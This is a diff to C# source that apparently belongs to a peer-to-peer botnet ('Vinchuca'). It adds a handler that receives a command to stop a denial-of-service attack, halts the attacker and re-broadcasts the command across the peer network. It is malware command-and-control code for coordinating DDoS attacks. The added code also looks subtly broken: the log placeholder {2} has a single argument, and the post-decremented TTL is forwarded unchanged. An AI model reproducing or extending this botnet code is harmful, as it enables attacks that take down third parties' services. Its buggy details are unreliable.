@@ -38,6 +38,30 @@ namespace Vinchuca.Network.Protocol.Handlers.Command
         }
     }
 
+    class DosStopAttackHandler : IMessageHandler
+    {
+        private readonly PeerList _peerList;
+        private readonly MessageManager _messageManager;
+        public DosStopAttackHandler(PeerList peerList, MessageManager messageManager)
+        {
+            _peerList = peerList;
+            _messageManager = messageManager;
+        }
+
+        public void Handle(BotMessage botMessage)
+        {
+            var msg = botMessage.Message as DosStopAttackMessage;
+            Attacker attacker;
+            if (Attacker.Attackers.TryGetValue(msg.AttackId, out attacker))
+            {
+                Attacker.Logger.Info("Stopping attack {2}", msg.AttackId);
+                attacker.Stop();
+                Attacker.Attackers.Remove(msg.AttackId);
+            }
+            _messageManager.Broadcast(msg, botMessage.Header.Ttl--);
+        }
+    }
+
     static class AttackFactory
     {
         public static Attack Create(DosAttackMessage msg)
